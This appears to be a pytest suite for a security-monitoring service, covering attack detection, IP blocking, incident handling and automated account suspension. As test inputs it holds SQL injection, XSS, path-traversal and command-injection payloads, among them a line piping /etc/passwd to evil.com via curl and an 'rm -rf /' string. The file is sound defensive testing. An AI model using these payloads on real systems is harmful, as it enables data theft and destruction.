"""Comprehensive tests for SecOps Cybersecurity Protection and Monitoring System.

Testing:
- Input validation & attack signature detection (SQLi, XSS, Command Injection, Path Traversal)
- Dynamic risk scoring and severity categorization (LOW, MEDIUM, HIGH, CRITICAL)
- IP threat monitoring & reputation tracking
- Automatic IP restriction and rate limiting
- ServiceNow SIR Incident Lifecycle & SOAR Containment (Isolate IP)
- External Threat Intelligence IoC matching & enrichment
- Security history logs and tamper-resistant audit trails without secrets
"""
import pytest
from datetime import datetime, timezone, timedelta
from fastapi.testclient import TestClient
from app.main import create_app
from app.db.engine import SessionLocal, init_database
from app.db.models import (
    User,
    UserRole,
    SecurityEvent,
    SecurityIncident,
    IpReputation,
    ThreatIntelIndicator,
    Grant,
    AccessRequest,
    Resource,
    Session as SessionModel,
    AuditEvent,
    Notification,
)
from app.services.gateway import SimulationGateway
from app.domain.secops import (
    scan_input,
    calculate_risk_score,
    evaluate_ip_action,
    sanitize_content,
    mask_sensitive_data,
)


@pytest.fixture
def client():
    app = create_app()
    with TestClient(app) as c:
        yield c


@pytest.fixture(autouse=True)
def setup_secops_data():
    init_database()
    db = SessionLocal()
    try:
        # Ensure Rachel Ramos (Security Officer) exists and is active
        r_user = db.get(User, "R001")
        if not r_user:
            db.add(User(sub="R001", display_name="Rachel Ramos (SecOps Admin)", department="Security", active=True))
            db.add(UserRole(sub="R001", role="risk_reviewer"))
            db.add(UserRole(sub="R001", role="security_admin"))
        else:
            r_user.active = True

        # Add Threat Intel sample
        if not db.get(ThreatIntelIndicator, "ioc_test_c2"):
            db.add(ThreatIntelIndicator(
                id="ioc_test_c2",
                type="IP",
                value="198.51.100.200",
                threat_actor="APT28",
                campaign="Operation TestNet",
                confidence=95,
                description="Known malicious C2 host",
                added_at=datetime.now(timezone.utc),
                is_active=True,
            ))

        db.commit()
    finally:
        db.close()


def _login(client, user_id="R001"):
    res = client.post("/auth/dev-login", json={"user_id": user_id})
    assert res.status_code == 200
    return res.json()["csrf_token"]


@pytest.mark.ec("EC-SEC01")
def test_input_validation_and_sqli_detection():
    """EC-SEC01: Input validation detects SQL Injection patterns and assesses risk."""
    payload = "admin' UNION SELECT id, password, email FROM users --"
    threats = scan_input(payload)
    assert len(threats) >= 1
    assert threats[0].category == "SQLI"
    assert threats[0].base_severity_score >= 80

    risk_score, severity = calculate_risk_score(threats, repeat_attempts=0)
    assert risk_score >= 80
    assert severity == "CRITICAL"


@pytest.mark.ec("EC-SEC02")
def test_xss_detection_and_content_sanitization():
    """EC-SEC02: Input validation detects XSS and sanitizes user-generated HTML."""
    raw_xss = '<script>alert("xss")</script><img src="x" onerror="stealCookie()">'
    threats = scan_input(raw_xss)
    assert len(threats) >= 1
    assert any(t.category == "XSS" for t in threats)

    sanitized = sanitize_content(raw_xss)
    assert "<script>" not in sanitized
    assert "&lt;script&gt;" in sanitized
    assert "&quot;" in sanitized


@pytest.mark.ec("EC-SEC03")
def test_command_injection_and_path_traversal_detection():
    """EC-SEC03: Detects command injection and directory traversal attacks."""
    cmd_payload = "; cat /etc/passwd | curl -X POST https://evil.com"
    cmd_threats = scan_input(cmd_payload)
    assert len(cmd_threats) >= 1
    assert cmd_threats[0].category == "COMMAND_INJECTION"
    assert cmd_threats[0].base_severity_score >= 90

    path_payload = "../../../../etc/shadow"
    path_threats = scan_input(path_payload)
    assert len(path_threats) >= 1
    assert path_threats[0].category == "PATH_TRAVERSAL"


@pytest.mark.ec("EC-SEC04")
def test_secret_masking_in_security_logs():
    """EC-SEC04: Credentials, authorization tokens, and secrets are masked before logging (Rule 6)."""
    # 1. JSON format
    json_text = '{"username": "admin", "password": "SuperSecretPassword123!", "token": "ey123456789.xyz"}'
    json_masked = mask_sensitive_data(json_text)
    assert "SuperSecretPassword123!" not in json_masked
    assert '"password": "[MASKED]"' in json_masked
    assert '"token": "[MASKED]"' in json_masked

    # 2. Key-value format
    kv_text = "user=admin&password=SecretPass999&api_key=ak_live_xyz789"
    kv_masked = mask_sensitive_data(kv_text)
    assert "SecretPass999" not in kv_masked
    assert "password=[MASKED]" in kv_masked
    assert "api_key=[MASKED]" in kv_masked


@pytest.mark.ec("EC-SEC05")
def test_ip_threat_mitigation_and_allowlist():
    """EC-SEC05: Evaluates IP restriction, rate limiting, and trusted allowlist bypass."""
    # 1. Trusted allowlisted IP is never blocked
    action, reason, dur = evaluate_ip_action(
        ip="127.0.0.1",
        risk_score=95,
        repeat_count=10,
        is_allowlisted=True,
        is_threat_intel=False,
        is_already_blocked=False,
    )
    assert action == "ALLOWED"
    assert "allowlist" in reason

    # 2. Critical attack triggers immediate block
    action, reason, dur = evaluate_ip_action(
        ip="203.0.113.5",
        risk_score=85,
        repeat_count=0,
        is_allowlisted=False,
        is_threat_intel=False,
        is_already_blocked=False,
    )
    assert action == "BLOCKED"
    assert dur >= 3600

    # 3. Threat intel match triggers extended block
    action, reason, dur = evaluate_ip_action(
        ip="198.51.100.200",
        risk_score=85,
        repeat_count=0,
        is_allowlisted=False,
        is_threat_intel=True,
        is_already_blocked=False,
    )
    assert action == "BLOCKED"
    assert dur >= 7200


@pytest.mark.ec("EC-SEC06")
def test_waf_simulation_endpoint_and_auto_incident(client):
    """EC-SEC06: WAF Simulator tests SQLi payload, generates SecurityEvent, and auto-opens SecurityIncident."""
    csrf = _login(client, "R001")
    sim_payload = {
        "source_ip": "198.51.100.77",
        "method": "POST",
        "path": "/api/resources/finance.csv/query",
        "payload": {"query": "' UNION SELECT * FROM users WHERE '1'='1' --"},
        "user_sub": "E102",
    }
    res = client.post("/api/secops/simulate", headers={"X-CSRF-Token": csrf}, json=sim_payload)
    assert res.status_code == 200
    data = res.json()

    assert data["allowed"] is False
    assert data["action"] == "BLOCKED"
    assert data["severity"] == "CRITICAL"
    assert data["risk_score"] >= 80
    assert len(data["threats_detected"]) >= 1
    assert data["incident_id"] is not None
    assert data["incident_id"].startswith("INC-2026-")

    # Verify incident exists via API
    inc_res = client.get(f"/api/secops/incidents/{data['incident_id']}")
    assert inc_res.status_code == 200
    inc_data = inc_res.json()
    assert inc_data["status"] == "NEW"
    assert inc_data["priority"] == "P1"
    assert inc_data["source_ip"] == "198.51.100.77"


@pytest.mark.ec("EC-SEC07")
def test_incident_lifecycle_and_soar_containment(client):
    """EC-SEC07: Updates incident through ServiceNow SIR stages and executes SOAR containment."""
    csrf = _login(client, "R001")
    # 1. Trigger incident via simulation
    sim_payload = {
        "source_ip": "198.51.100.88",
        "method": "POST",
        "path": "/api/resources/finance.csv/query",
        "payload": {"query": "; rm -rf / ; cat /etc/passwd"},
    }
    sim_res = client.post("/api/secops/simulate", headers={"X-CSRF-Token": csrf}, json=sim_payload)
    incident_id = sim_res.json()["incident_id"]

    # 2. Update status to INVESTIGATING with analyst notes
    update_payload = {
        "status": "INVESTIGATING",
        "assigned_to": "R001",
        "note": "Analyst investigating suspicious bash reverse shell payload.",
    }
    patch_res = client.patch(f"/api/secops/incidents/{incident_id}", headers={"X-CSRF-Token": csrf}, json=update_payload)
    assert patch_res.status_code == 200
    assert patch_res.json()["status"] == "INVESTIGATING"

    # 3. Execute SOAR Containment (Isolate IP at WAF)
    contain_res = client.post(f"/api/secops/incidents/{incident_id}/contain", headers={"X-CSRF-Token": csrf}, json={"action": "isolate_ip"})
    assert contain_res.status_code == 200
    assert contain_res.json()["result"]["status"] == "PERM_BLOCKED"

    # Verify IP is now PERM_BLOCKED in reputation table
    ip_res = client.get("/api/secops/ips")
    ips = ip_res.json()["ips"]
    target_rep = next(i for i in ips if i["ip"] == "198.51.100.88")
    assert target_rep["status"] == "PERM_BLOCKED"


@pytest.mark.ec("EC-SEC08")
def test_manual_ip_block_unblock_and_allowlist_api(client):
    """EC-SEC08: Administrative manual IP blocking, unblocking, and allowlisting."""
    csrf = _login(client, "R001")
    test_ip = "203.0.113.99"

    # 1. Admin blocks IP
    block_res = client.post("/api/secops/ips/block", headers={"X-CSRF-Token": csrf}, json={
        "ip": test_ip,
        "reason": "Administrative block from threat report",
        "is_permanent": True,
    })
    assert block_res.status_code == 200
    assert block_res.json()["status"] == "PERM_BLOCKED"

    # 2. Admin unblocks IP
    unblock_res = client.post("/api/secops/ips/unblock", headers={"X-CSRF-Token": csrf}, json={
        "ip": test_ip,
        "reason": "False positive resolved",
    })
    assert unblock_res.status_code == 200
    assert unblock_res.json()["status"] == "CLEAN"

    # 3. Admin adds IP to allowlist
    allow_res = client.post("/api/secops/ips/allowlist", headers={"X-CSRF-Token": csrf}, json={
        "ip": test_ip,
        "reason": "Designated corporate audit scanner",
    })
    assert allow_res.status_code == 200
    assert allow_res.json()["status"] == "ALLOWLISTED"


@pytest.mark.ec("EC-SEC09")
def test_threat_intel_repository_management(client):
    """EC-SEC09: Threat Intelligence (TISC) IoC indicator creation and retrieval."""
    csrf = _login(client, "R001")
    new_ioc = {
        "type": "DOMAIN",
        "value": "apt29-test-dropzone.org",
        "threat_actor": "APT29",
        "campaign": "Cloud Breach Campaign",
        "confidence": 92,
        "description": "Staging server identified in external cyber threat feed",
    }
    res = client.post("/api/secops/threat-intel", headers={"X-CSRF-Token": csrf}, json=new_ioc)
    assert res.status_code == 200
    assert res.json()["value"] == "apt29-test-dropzone.org"

    # Retrieve indicators
    list_res = client.get("/api/secops/threat-intel?type=DOMAIN")
    assert list_res.status_code == 200
    indicators = list_res.json()["indicators"]
    assert any(i["value"] == "apt29-test-dropzone.org" for i in indicators)


@pytest.mark.ec("EC-SEC10")
def test_repeated_malicious_requests_revoke_access_and_block_user(client):
    """EC-SEC10: Repeated malicious requests from same IP automatically revoke grants and block user account."""
    init_database()
    db = SessionLocal()
    test_ip = "198.51.100.177"
    user_id = "usr_malicious_bob"
    grant_id = "grant_bob_001"
    res_id = "dataset_risk_model"

    try:
        # 1. Setup resource, user with active grant and active session
        if not db.get(Resource, res_id):
            db.add(Resource(
                id=res_id,
                name="Risk Evaluation Model",
                kind="model",
                tier="RESTRICTED_SYNTHETIC",
                owner_sub="R001",
                allowed_actions=[{"name": "query", "risk_weight": 20}],
                active=True,
            ))
        db.query(SecurityIncident).filter((SecurityIncident.user_sub == user_id) | (SecurityIncident.source_ip == test_ip)).delete()
        db.query(SecurityEvent).filter((SecurityEvent.user_sub == user_id) | (SecurityEvent.source_ip == test_ip)).delete()
        db.query(Notification).filter(Notification.to_sub == user_id).delete()
        db.query(Grant).filter(Grant.requester_sub == user_id).delete()
        db.query(AccessRequest).filter(AccessRequest.requester_sub == user_id).delete()
        db.query(SessionModel).filter(SessionModel.sub == user_id).delete()
        db.query(UserRole).filter(UserRole.sub == user_id).delete()
        db.query(User).filter(User.sub == user_id).delete()
        db.query(IpReputation).filter(IpReputation.ip == test_ip).delete()
        db.commit()

        user = User(
            sub=user_id,
            display_name="Malicious Bob",
            email="bob.attacker@example.org",
            department="Operations",
            active=True,
        )
        db.add(user)
        db.commit()

        t0 = datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc)

        # Create access request required by FK
        db.add(AccessRequest(
            id="req_bob_001",
            requester_sub=user_id,
            resource_id=res_id,
            purpose_code="SECURITY_REDTEAM_SIM",
            purpose_text="Testing redteam sim",
            actions=["query"],
            duration_minutes=1440,
            risk_controls=["activity_logging"],
            status="APPROVED",
            policy_version=1,
            content_hash="content_hash_bob",
            created_at=t0 - timedelta(hours=2),
        ))
        db.commit()

        # Create active grant
        active_grant = Grant(
            id=grant_id,
            request_id="req_bob_001",
            requester_sub=user_id,
            resource_id=res_id,
            purpose_code="SECURITY_REDTEAM_SIM",
            actions=["query"],
            activated_at=t0 - timedelta(hours=1),
            expires_at=t0 + timedelta(hours=24),
            status="ACTIVE",
            revoked_at=None,
        )
        db.add(active_grant)
        # Create active session
        session_row = SessionModel(
            id="hashed_session_bob_001",
            sub=user_id,
            csrf_token="csrf_bob_token",
            created_at=t0,
            last_seen_at=t0,
            absolute_expires_at=t0 + timedelta(hours=8),
        )
        db.add(session_row)
        db.commit()

        # Verify gateway allows access before attack
        res_before = SimulationGateway.invoke(
            db=db,
            resource_id=res_id,
            action="query",
            declared_purpose="SECURITY_REDTEAM_SIM",
            caller_sub=user_id,
            now=t0,
        )
        assert res_before["decision"]["allow"] is True

        # Close db before making API calls via client to avoid SQLite file lock
        db.close()

        # 2. Simulate 3 repeated malicious attack requests from the same IP
        csrf_admin = _login(client, "R001")
        sim_data = None
        user_blocked_observed = False
        total_revoked = 0
        for i in range(3):
            sim_res = client.post(
                "/api/secops/simulate",
                headers={"X-CSRF-Token": csrf_admin},
                json={
                    "source_ip": test_ip,
                    "method": "POST",
                    "path": f"/api/resources/{res_id}/query",
                    "payload": f"SELECT * FROM users WHERE id='1' OR '1'='1' -- attempt {i}",
                    "user_sub": user_id,
                },
            )
            assert sim_res.status_code == 200
            sim_data = sim_res.json()
            assert sim_data["action"] == "BLOCKED"
            if sim_data.get("user_blocked"):
                user_blocked_observed = True
            total_revoked += sim_data.get("revoked_grants_count", 0)

        # On repeated attack, automated containment must trigger:
        assert user_blocked_observed is True
        assert total_revoked >= 1

        # 3. Verify in database: User account blocked, Grant revoked, Sessions deleted
        db = SessionLocal()
        user_db = db.get(User, user_id)
        assert user_db.active is False

        grant_db = db.get(Grant, grant_id)
        assert grant_db.status == "REVOKED"
        assert grant_db.revoked_at is not None
        assert grant_db.revoke_emergency is True
        assert grant_db.revoke_reason_code == "SECURITY_INCIDENT"

        active_sessions = db.query(SessionModel).filter(SessionModel.sub == user_id).all()
        assert len(active_sessions) == 0

        # Verify audit events written in same transaction
        suspend_event = db.query(AuditEvent).filter(
            AuditEvent.subject_type == "user",
            AuditEvent.subject_id == user_id,
            AuditEvent.type == "USER_SUSPENDED",
        ).first()
        assert suspend_event is not None
        assert suspend_event.payload["action"] == "ACCOUNT_DEACTIVATED_AND_SESSIONS_TERMINATED"

        revoke_event = db.query(AuditEvent).filter(
            AuditEvent.subject_type == "grant",
            AuditEvent.subject_id == grant_id,
            AuditEvent.type == "GRANT_REVOKED",
        ).first()
        assert revoke_event is not None
        assert revoke_event.payload["emergency"] is True

        # 4. Verify Gateway PEP now rejects the user and grant
        res_after = SimulationGateway.invoke(
            db=db,
            resource_id=res_id,
            action="query",
            declared_purpose="SECURITY_REDTEAM_SIM",
            caller_sub=user_id,
            now=t0 + timedelta(minutes=5),
        )
        assert res_after["decision"]["allow"] is False
        assert res_after["decision"]["code"] in ("DENY_USER_INACTIVE", "DENY_GRANT_REVOKED", "DENY_UNAUTHENTICATED")

    finally:
        try:
            db.rollback()
            db.query(SecurityIncident).filter((SecurityIncident.user_sub == user_id) | (SecurityIncident.source_ip == test_ip)).delete()
            db.query(SecurityEvent).filter((SecurityEvent.user_sub == user_id) | (SecurityEvent.source_ip == test_ip)).delete()
            db.query(Notification).filter(Notification.to_sub == user_id).delete()
            db.query(Grant).filter(Grant.requester_sub == user_id).delete()
            db.query(AccessRequest).filter(AccessRequest.requester_sub == user_id).delete()
            db.query(SessionModel).filter(SessionModel.sub == user_id).delete()
            db.query(UserRole).filter(UserRole.sub == user_id).delete()
            db.query(User).filter(User.sub == user_id).delete()
            db.query(IpReputation).filter(IpReputation.ip == test_ip).delete()
            db.commit()
        except Exception:
            pass
        finally:
            db.close()


@pytest.mark.ec("EC-SEC11")
def test_soar_containment_isolate_ip_and_block_user(client):
    """EC-SEC11: SOAR incident containment isolates IP and blocks user account with grant revocation."""
    init_database()
    db = SessionLocal()
    test_ip = "198.51.100.188"
    user_id = "usr_contain_target"
    grant_id = "grant_contain_001"
    res_id = "dataset_risk_model"

    try:
        if not db.get(Resource, res_id):
            db.add(Resource(
                id=res_id,
                name="Risk Evaluation Model",
                kind="model",
                tier="RESTRICTED_SYNTHETIC",
                owner_sub="R001",
                allowed_actions=[{"name": "query", "risk_weight": 20}],
                active=True,
            ))
        db.query(SecurityIncident).filter((SecurityIncident.user_sub == user_id) | (SecurityIncident.source_ip == test_ip)).delete()
        db.query(SecurityEvent).filter((SecurityEvent.user_sub == user_id) | (SecurityEvent.source_ip == test_ip)).delete()
        db.query(Notification).filter(Notification.to_sub == user_id).delete()
        db.query(Grant).filter(Grant.requester_sub == user_id).delete()
        db.query(AccessRequest).filter(AccessRequest.requester_sub == user_id).delete()
        db.query(SessionModel).filter(SessionModel.sub == user_id).delete()
        db.query(UserRole).filter(UserRole.sub == user_id).delete()
        db.query(User).filter(User.sub == user_id).delete()
        db.query(IpReputation).filter(IpReputation.ip == test_ip).delete()
        db.commit()

        user = User(
            sub=user_id,
            display_name="Containment Target",
            email="target@example.org",
            department="Operations",
            active=True,
        )
        db.add(user)
        db.commit()

        t0 = datetime(2026, 11, 1, 14, 0, 0, tzinfo=timezone.utc)

        db.add(AccessRequest(
            id="req_contain_001",
            requester_sub=user_id,
            resource_id=res_id,
            purpose_code="SECURITY_REDTEAM_SIM",
            purpose_text="Testing redteam sim",
            actions=["query"],
            duration_minutes=1440,
            risk_controls=["activity_logging"],
            status="APPROVED",
            policy_version=1,
            content_hash="content_hash_contain",
            created_at=t0 - timedelta(hours=2),
        ))
        db.commit()

        db.add(Grant(
            id=grant_id,
            request_id="req_contain_001",
            requester_sub=user_id,
            resource_id=res_id,
            purpose_code="SECURITY_REDTEAM_SIM",
            actions=["query"],
            activated_at=t0,
            expires_at=t0 + timedelta(hours=24),
            status="ACTIVE",
        ))
        db.commit()
        # Close db before making API calls to avoid SQLite locks
        db.close()

        # 1. Trigger incident via simulation without user_sub (unauthenticated incident)
        csrf = _login(client, "R001")
        sim_res = client.post(
            "/api/secops/simulate",
            headers={"X-CSRF-Token": csrf},
            json={
                "source_ip": test_ip,
                "method": "POST",
                "path": f"/api/resources/{res_id}/query",
                "payload": "; rm -rf / ; cat /etc/passwd",
            },
        )
        assert sim_res.status_code == 200
        incident_id = sim_res.json()["incident_id"]
        assert incident_id is not None

        # Link incident to the target user so SOAR containment knows which user to contain
        db = SessionLocal()
        inc = db.get(SecurityIncident, incident_id)
        assert inc is not None
        inc.user_sub = user_id
        db.commit()
        db.close()

        # 2. Call SOAR containment: isolate_ip_and_block_user
        contain_res = client.post(
            f"/api/secops/incidents/{incident_id}/contain",
            headers={"X-CSRF-Token": csrf},
            json={"action": "isolate_ip_and_block_user"},
        )
        assert contain_res.status_code == 200
        data = contain_res.json()["result"]
        assert data["action"] == "isolate_ip_and_block_user"
        assert data["status"] == "PERM_BLOCKED"
        assert data["user_blocked"] is True
        assert data["revoked_grants_count"] >= 1

        # 3. Verify DB state: IP is PERM_BLOCKED, User is inactive, Grant is REVOKED
        db = SessionLocal()
        rep = db.get(IpReputation, test_ip)
        assert rep is not None
        assert rep.status == "PERM_BLOCKED"

        user_db = db.get(User, user_id)
        assert user_db is not None
        assert user_db.active is False

        grant_db = db.get(Grant, grant_id)
        assert grant_db is not None
        assert grant_db.status == "REVOKED"
        assert grant_db.revoke_emergency is True

    finally:
        try:
            db.rollback()
            db.query(SecurityIncident).filter((SecurityIncident.user_sub == user_id) | (SecurityIncident.source_ip == test_ip)).delete()
            db.query(SecurityEvent).filter((SecurityEvent.user_sub == user_id) | (SecurityEvent.source_ip == test_ip)).delete()
            db.query(Notification).filter(Notification.to_sub == user_id).delete()
            db.query(Grant).filter(Grant.requester_sub == user_id).delete()
            db.query(AccessRequest).filter(AccessRequest.requester_sub == user_id).delete()
            db.query(SessionModel).filter(SessionModel.sub == user_id).delete()
            db.query(UserRole).filter(UserRole.sub == user_id).delete()
            db.query(User).filter(User.sub == user_id).delete()
            db.query(IpReputation).filter(IpReputation.ip == test_ip).delete()
            db.commit()
        except Exception:
            pass
        finally:
            db.close()
